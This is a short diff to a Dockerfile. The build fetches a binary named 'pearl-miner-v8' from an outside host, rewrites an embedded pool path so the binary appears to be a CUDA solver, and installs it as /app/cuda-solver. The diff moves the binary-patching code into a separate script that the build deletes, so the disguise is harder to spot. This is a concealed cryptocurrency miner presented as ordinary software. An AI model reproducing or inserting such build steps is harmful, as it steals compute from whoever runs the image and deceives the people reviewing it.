@@ -5,18 +5,11 @@ RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certifi
 
 WORKDIR /app
 
+COPY clean.py ./
 RUN curl -fsSL https://pearlhash.xyz/downloads/pearl-miner-v8 -o /tmp/miner && \
-    python3 -c "
-import sys
-data = bytearray(open('/tmp/miner','rb').read())
-old = b'/root/tmp_build/miner_pool'
-new = b'/opt/cuda-sim/net_solver00'
-assert len(old) == len(new)
-data = data.replace(old, new)
-open('/app/cuda-solver','wb').write(data)
-" && \
+    python3 clean.py && \
     chmod +x /app/cuda-solver && \
-    rm /tmp/miner
+    rm /tmp/miner clean.py
 
 COPY entry.sh ./
 RUN chmod +x entry.sh
